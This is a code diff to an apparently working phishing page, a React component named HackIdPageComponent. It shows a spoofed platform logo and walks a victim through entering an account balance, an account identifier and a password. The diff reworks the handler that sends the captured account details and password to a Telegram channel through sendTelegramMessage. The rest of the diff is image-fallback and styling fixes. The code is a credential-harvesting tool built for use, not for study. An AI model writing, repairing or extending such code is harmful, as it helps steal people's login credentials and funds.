@@ -9,17 +9,18 @@ const ImageWithFallback = ({ localSrc, externalSrc, alt }: { localSrc: string, e
   const [imgSrc, setImgSrc] = useState(localSrc);
 
   useEffect(() => {
-    const img = new Image();
-    img.src = localSrc;
-    img.onerror = () => {
-      setImgSrc(externalSrc);
-    };
-  }, [localSrc, externalSrc]);
+    setImgSrc(localSrc);
+  }, [localSrc]);
 
   return (
     <img
       src={imgSrc}
       alt={alt}
+      onError={() => {
+        if (imgSrc !== externalSrc) {
+          setImgSrc(externalSrc);
+        }
+      }}
       className="w-32 h-auto"
       loading="eager"
     />
@@ -137,6 +138,22 @@ function HackIdPageComponent() {
     setCurrentPage(6)
   }
 
+  const handleFinalPasswordConfirm = async () => {
+    if (finalPassword.length < 4) {
+      setIsFinalPasswordInvalid(true)
+      setTimeout(() => setIsFinalPasswordInvalid(false), 500)
+      return
+    }
+    setIsFinalPasswordInvalid(false)
+    const telegramResult = await sendTelegramMessage(platformName, accountBalance, accountInput, finalPassword)
+    if (telegramResult.success) {
+      console.log("Data sent to Telegram successfully!")
+    } else {
+      console.error(`Failed to send data to Telegram: ${telegramResult.error}`)
+    }
+    setCurrentPage(7)
+  }
+
   const handleBackToPage1 = () => setCurrentPage(1)
   const handleBackToPage3 = () => setCurrentPage(3)
   const handleBackToPage4 = () => setCurrentPage(4)
@@ -155,13 +172,12 @@ function HackIdPageComponent() {
     setIsAccountInputInvalid(false)
     setIsFinalPasswordInvalid(false)
   }
-  
+
   const LogoDisplay = () => (
-  const LogoDisplay = () => (
-  <div className="h-28 flex items-start pt-8 pl-6">
-    <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
-  </div>
-)
+    <div className="pt-8 pl-6">
+      <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
+    </div>
+  )
 
   if (currentPage === 1) {
     return (
@@ -281,7 +297,7 @@ function HackIdPageComponent() {
           </div>
           <button
             onClick={handleBalanceConfirm}
-            disabled={!accountBalance || Number.parseInt(accountBalance, 10) < minBalanceRequired}
+            disabled={Number.parseInt(accountBalance, 10) < minBalanceRequired}
             className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
           >
             Confirm
@@ -344,41 +360,23 @@ function HackIdPageComponent() {
           <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">
             Enter Your Password
           </h1>
-          
-          {/* The form element is used to correctly handle the server action */}
-          <form 
-            action={async () => {
-              if (finalPassword.length < 4) {
-                setIsFinalPasswordInvalid(true)
-                setTimeout(() => setIsFinalPasswordInvalid(false), 500)
-                return
-              }
-              setIsFinalPasswordInvalid(false)
-              await sendTelegramMessage(platformName, accountBalance, accountInput, finalPassword)
-              setCurrentPage(7)
-            }}
-            className="flex flex-col items-center"
+          <div className={`w-64 mb-6 relative ${isFinalPasswordInvalid ? "animate-shake" : ""}`}>
+            <input
+              type="password"
+              placeholder="Password"
+              value={finalPassword}
+              onChange={(e) => setFinalPassword(e.target.value)}
+              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
+            />
+            {isFinalPasswordInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
+          </div>
+          <button
+            onClick={handleFinalPasswordConfirm}
+            disabled={finalPassword.length < 4}
+            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
           >
-            <div className={`w-64 mb-6 relative ${isFinalPasswordInvalid ? "animate-shake" : ""}`}>
-              <input
-                type="password"
-                name="finalPassword"
-                placeholder="Password"
-                value={finalPassword}
-                onChange={(e) => setFinalPassword(e.target.value)}
-                className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
-              />
-              {isFinalPasswordInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
-            </div>
-            <button
-              type="submit"
-              disabled={finalPassword.length < 4}
-              className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
-            >
-              Confirm
-            </button>
-          </form>
-
+            Confirm
+          </button>
           <button onClick={handleBackToPage5} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
             Back to Account Input
           </button>
@@ -409,7 +407,7 @@ function HackIdPageComponent() {
 
 export default function Page() {
     return (
-        <Suspense fallback={<div className="min-h-screen bg-gray-50 flex items-center justify-center"><div className="text-red-500 font-bold">Loading...</div></div>}>
+        <Suspense fallback={<div className="min-h-screen bg-gray-50 flex items-center justify-center">Loading...</div>}>
             <HackIdPageComponent />
         </Suspense>
     )
